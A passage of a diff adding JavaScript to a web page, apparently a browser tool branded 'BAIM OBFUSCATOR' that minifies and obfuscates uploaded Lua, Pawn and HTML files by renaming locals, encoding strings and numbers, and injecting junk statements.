+                        tokens[j - 1];
+
+                    if(
+                        !previous ||
+                        previous.value !== "."
+                    ){
+
+                        tokens[j].value =
+                            declare(
+                                tokens[j].value
+                            );
+                    }
+                }
+
+                j++;
+            }
+
+            scopes.pop();
+        }
+    }
+
+    /*
+     * Ganti identifier yang memang sudah
+     * tercatat sebagai local.
+     *
+     * String/comment tidak disentuh.
+     */
+
+    for(let i = 0; i < tokens.length; i++){
+
+        const t = tokens[i];
+
+        if(
+            t.type !== "identifier"
+        ){
+            continue;
+        }
+
+        if(
+            LUA_RESERVED.has(t.value) ||
+            LUA_GLOBALS.has(t.value)
+        ){
+            continue;
+        }
+
+        const previous =
+            tokens[i - 1];
+
+        /*
+         * Jangan mengubah:
+         * object.key
+         * object:key
+         */
+
+        if(
+            previous &&
+            (
+                previous.value === "." ||
+                previous.value === ":"
+            )
+        ){
+            continue;
+        }
+
+        const mapped =
+            find(t.value);
+
+        if(mapped)
+            t.value = mapped;
+    }
+
+    return tokens;
+}
+
+/* =========================================================
+   LUA TOKENS -> SOURCE
+========================================================= */
+
+function tokensToLua(tokens){
+
+    return tokens
+        .map(t => t.value)
+        .join("");
+}
+
+/* =========================================================
+   LUA MINIFIER
+========================================================= */
+
+function minifyLua(source){
+
+    const tokens =
+        lexLua(source);
+
+    let result = "";
+
+    for(
+        let i = 0;
+        i < tokens.length;
+        i++
+    ){
+
+        const t = tokens[i];
+
+        if(t.type === "space"){
+
+            const previous =
+                tokens[i - 1];
+
+            const next =
+                tokens[i + 1];
+
+            if(
+                previous &&
+                next &&
+                (
+                    (
+                        (
+                            previous.type === "identifier" ||
+                            previous.type === "number"
+                        ) &&
+                        (
+                            next.type === "identifier" ||
+                            next.type === "number"
+                        )
+                    )
+                )
+            ){
+
+                result += " ";
+            }
+
+            continue;
+        }
+
+        result += t.value;
+    }
+
+    return result.trim();
+}
+
+/* =========================================================
+   LUA JUNK INJECTION
+========================================================= */
+
+function injectLuaJunk(source){
+
+    const junkStatements = [
+        `do local _=nil end;`,
+        `local _=0;`,
+        `do local _=math.random(1) end;`,
+        `do local _=string.rep("",0) end;`,
+        `local _=#"";`,
+        `do local _=tonumber("0") end;`
+    ];
+
+    // Tambahkan 2-3 junk di awal
+    let result = "";
+    const count = 2 + Math.floor(Math.random()*2);
+    for(let i=0; i<count; i++){
+        result += junkStatements[
+            Math.floor(Math.random()*junkStatements.length)
+        ];
+    }
+
+    result += source;
+
+    // Tambahkan 1-2 junk di akhir
+    const countEnd = 1 + Math.floor(Math.random()*2);
+    for(let i=0; i<countEnd; i++){
+        result += junkStatements[
+            Math.floor(Math.random()*junkStatements.length)
+        ];
+    }
+
+    return result;
+}
+
+/* =========================================================
+   LUA FULL PROCESSOR (ditingkatkan)
+========================================================= */
+
+function processLua(source){
+
+    let tokens =
+        lexLua(source);
+
+    /*
+     * Hapus comments
+     */
+
+    if($("comments").checked){
+
+        tokens =
+            tokens.filter(
+                t => t.type !== "comment"
+            );
+    }
+
+    /*
+     * Obfuscate strings
+     */
+
+    if($("strings").checked){
+
+        // Tambahkan deklarasi _d di awal nanti
+        for(
+            let i = 0;
+            i < tokens.length;
+            i++
+        ){
+
+            if(
+                tokens[i].type === "string"
+            ){
+
+                tokens[i].value =
+                    obfuscateLuaString(
+                        tokens[i].value
+                    );
+
+                tokens[i].type =
+                    "generated";
+            }
+        }
+    }
+
+    /*
+     * Rename locals
+     */
+
+    if($("names").checked){
+
+        tokens =
+            obfuscateLuaLocals(
+                tokens
+            );
+    }
+
+    /*
+     * Enkripsi angka
+     */
+
+    if($("numObf").checked){
+
+        for(
+            let i = 0;
+            i < tokens.length;
+            i++
+        ){
+
+            if(
+                tokens[i].type === "number"
+            ){
+
+                tokens[i].value =
+                    obfuscateLuaNumber(
+                        tokens[i].value
+                    );
+
+                tokens[i].type =
+                    "generated";
+            }
+        }
+    }
+
+    let result =
+        tokensToLua(tokens);
+
+    // Jika strings diobfuscate, tambahkan deklarasi _d di awal
+    if($("strings").checked && result.includes("_d(")){
+        result = "local _d=string.char;" + result;
+    }
+
+    if($("minify").checked){
+
+        result =
+            minifyLua(result);
+    }
+
+    /*
+     * Runtime layer (variabel dummy)
+     */
+
+    if($("junk").checked){
+
+        const dummy =
+            randomIdentifier();
+
+        result =
+            "local " +
+            dummy +
+            "=nil;" +
+            result;
+    }
+
+    /*
+     * Suntik kode sampah
+     */
+
+    if($("junkObf").checked){
+
+        result =
+            injectLuaJunk(result);
+    }
+
+    /* ==== UPDATE: paksa satu baris ==== */
+    result = result.replace(/\r?\n/g, " ");
+
+    /*
+     * Hanya branding.
+     */
+
+    return (
+        "-- BAIM OBFUSCATOR\n" +
+        result
+    );
+}
+
+/* =========================================================
+   PAWN COMMENT REMOVER
+========================================================= */
+
+function removePawnComments(source){
+
+    let result = "";
+    let i = 0;
+    let inString = false;
+
+    while(i < source.length){
+
+        const c = source[i];
+
+        if(
+            c === '"' &&
+            source[i - 1] !== "\\"
+        ){
+
+            inString =
+                !inString;
+
+            result += c;
+            i++;
+            continue;
+        }
+
+        if(
+            !inString &&
+            c === "/" &&
+            source[i + 1] === "/"
+        ){
+
+            while(
+                i < source.length &&
+                source[i] !== "\n"
+            ){
+                i++;
+            }
+
+            result += "\n";
+            continue;
+        }
+
+        if(
+            !inString &&
+            c === "/" &&
+            source[i + 1] === "*"
+        ){
+
+            const end =
+                source.indexOf(
+                    "*/",
+                    i + 2
+                );
+
+            if(end === -1)
+                break;
+
+            i = end + 2;
+            result += "\n";
+            continue;
+        }
+
+        result += c;
+        i++;
+    }
+
+    return result;
+}
+
+/* =========================================================
+   PAWN STRING ENCODER
+========================================================= */
+
+function encodePawnStrings(source){
+
+    let result = "";
+    let i = 0;
+
+    while(i < source.length){
+
+        if(source[i] !== '"'){
+
+            result += source[i];
+            i++;
+            continue;
+        }
+
+        let j = i + 1;
+
+        while(j < source.length){
+
+            if(
+                source[j] === "\\" &&
+                j + 1 < source.length
+            ){
+
+                j += 2;
+                continue;
+            }
+
+            if(source[j] === '"'){
+
+                j++;
+                break;
+            }
+
+            j++;
+        }
+
+        const raw =
+            source.slice(i + 1,j - 1);
+
+        /*
+         * Pawn compatibility lebih baik
+         * dijaga dengan escape numerik.
+         */
+
+        let encoded = "";
+
+        for(
+            let k = 0;
+            k < raw.length;
+            k++
+        ){
+
+            const code =
+                raw.charCodeAt(k);
+
+            encoded +=
+                "\\x" +
+                code
+                    .toString(16)
+                    .padStart(2,"0");
+        }
+
+        result +=
+            '"' +
+            encoded +
+            '"';
+
+        i = j;
+    }
+
+    return result;
+}
+
+/* =========================================================
+   PAWN MINIFY
+========================================================= */
+
+function minifyPawn(source){
+
+    return source
+        .replace(/\r\n/g,"\n")
+        .replace(/[ \t]+/g," ")
+        .replace(/\n[ \t]+/g,"\n")
+        .replace(/\n{2,}/g,"\n")
+        .trim();
+}
+
+/* =========================================================
+   PAWN
+========================================================= */
+
+function processPawn(source){
+
+    if($("comments").checked){
+
+        source =
+            removePawnComments(
+                source
+            );
+    }
+
+    if($("strings").checked){
+
+        source =
+            encodePawnStrings(
+                source
+            );
+    }
+
+    /*
+     * Identifier Pawn sengaja tidak
+     * diacak secara agresif karena
+     * native/forward/public callback
+     * bisa bergantung pada nama.
+     */
+
+    if($("minify").checked){
+
+        source =
+            minifyPawn(
+                source
+            );
+    }
+
+    /* ==== UPDATE: paksa satu baris ==== */
+    source = source.replace(/\r?\n/g, " ");
+
+    return (
+        "/* BAIM OBFUSCATOR */\n" +
+        source
+    );
+}
+
+/* =========================================================
+   HTML
+========================================================= */
+
+function removeHTMLComments(source){
+
+    return source.replace(
+        /<!--[\s\S]*?-->/g,
+        ""
+    );
+}
+
+function minifyHTML(source){
+
+    source =
+        source.replace(
+            />\s+</g,
+            "><"
+        );
+
+    source =
+        source.replace(
+            /\s{2,}/g,
+            " "
+        );
+
+    return source.trim();
+}
+
+function processHTML(source){
+
+    if($("comments").checked){
+
+        source =
+            removeHTMLComments(
+                source
+            );
+    }
+
+    if($("minify").checked){
+
+        source =
+            minifyHTML(
+                source
+            );
+    }
+
+    /* ==== UPDATE: paksa satu baris ==== */
+    source = source.replace(/\r?\n/g, " ");
+
+    /*
+     * Jangan mengubah isi <script>,
+     * CSS, attribute, atau text HTML
+     * secara agresif karena bisa
+     * menyebabkan halaman rusak.
+     */
+
+    return (
+        "<!-- BAIM OBFUSCATOR -->\n" +
+        source
+    );
+}
+
+/* =========================================================
+   PROCESS
+========================================================= */
+
+function processSource(
+    source,
+    filename
+){
+
+    const ext =
+        filename
+            .toLowerCase()
+            .split(".")
+            .pop();
+
+    if(ext === "lua")
+        return processLua(source);
+
+    if(
+        ext === "pwn" ||
+        ext === "inc" ||
+        ext === "txt"
+    ){
+
+        return processPawn(source);
+    }
+
+    if(
+        ext === "html" ||
+        ext === "htm"
+    ){
+
+        return processHTML(source);
+    }
+
+    return source;
+}
+
+/* =========================================================
+   OUTPUT NAME
+========================================================= */
+
+function outputName(filename){
+
+    const dot =
+        filename.lastIndexOf(".");
+
+    if(dot === -1){
+
+        return (
+            filename +
+            "_BAIM_OBF"
+        );
+    }
+
+    return (
+        filename.slice(0,dot) +
+        "_BAIM_OBF" +
+        filename.slice(dot)
+    );
+}
+
+/* =========================================================
+   DOWNLOAD
+========================================================= */
+
+function downloadFile(
+    content,
+    filename,
+    mime
+){
+
+    const blob =
+        new Blob(
+            [content],
+            {type:mime}
+        );
+
+    const url =
+        URL.createObjectURL(blob);
+
+    const link =
+        document.createElement("a");
+
+    link.href = url;
+    link.download = filename;
+
+    document.body.appendChild(link);
+
+    link.click();
+
+    link.remove();
+
+    setTimeout(
+        () => URL.revokeObjectURL(url),
+        1500
+    );
+}
+
+/* =========================================================
+   START
+========================================================= */
+
+$("start").addEventListener(
+    "click",
+    async function(){
+
+        if(!selectedFile){
+
+            $("picker").click();
+            return;
+        }
+
+        const button = this;
+
+        button.classList.add(
+            "loading"
+        );
+
+        $("status").textContent =
+            "BAIM OBFUSCATOR";
+
+        try{
+
+            const source =
+                await selectedFile.text();
+
+            if(!source.trim()){
+
+                throw new Error(
+                    "EMPTY_FILE"
+                );
+            }
+
+            /*
+             * Supaya animasi loading
+             * sempat tampil.
+             */
+
+            await new Promise(
+                resolve =>
+                    setTimeout(
+                        resolve,
+                        300
+                    )
+            );
+
+            const result =
+                processSource(
+                    source,
+                    selectedFile.name
+                );
+
+            const ext =
+                selectedFile.name
+                    .toLowerCase()
+                    .split(".")
+                    .pop();
+
+            let mime =
+                "text/plain";
+
+            if(
+                ext === "html" ||
+                ext === "htm"
+            ){
+
+                mime =
+                    "text/html";
+            }
+
+            downloadFile(
+                result,
+                outputName(
+                    selectedFile.name
+                ),
+                mime
+            );
+
+            $("card")
+                .classList
+                .remove(
+                    "success"
+                );
+
+            void $("card").offsetWidth;
+
+            $("card")
+                .classList
+                .add(
+                    "success"
+                );
+
+            $("status").textContent =
+                "BAIM OBFUSCATOR";
+
+        }catch(error){
+
+            console.error(error);
+
+            $("status").textContent =
+                "BAIM OBFUSCATOR";
+        }
+
+        button.classList.remove(
+            "loading"
+        );
+    }
+);
+
+/* =========================================================
+   DRAG DROP
+========================================================= */
+
+const drop =
+    $("drop");
+
+[
+    "dragenter",
+    "dragover"
+].forEach(
+    eventName => {
+
+        drop.addEventListener(
+            eventName,
+            event => {
+
+                event.preventDefault();
+                event.stopPropagation();
+
+                drop.style.transform =
+                    "translateY(-4px) scale(1.01)";
+            }
+        );
+    }
+);
+
+[
+    "dragleave",
+    "drop"
+].forEach(
+    eventName => {
+
+        drop.addEventListener(
+            eventName,
+            event => {
+
+                event.preventDefault();
+                event.stopPropagation();
+
+                drop.style.transform = "";
+            }
+        );
+    }
+);
+
+drop.addEventListener(
+    "drop",
+    event => {
+
+        const files =
+            event.dataTransfer.files;
+
+        if(
+            !files ||
+            !files.length
+        ){
+            return;
+        }
+
+        selectedFile =
+            files[0];
+
+        showFile();
+    }
+);
 </script>
+
 </body>
 </html>
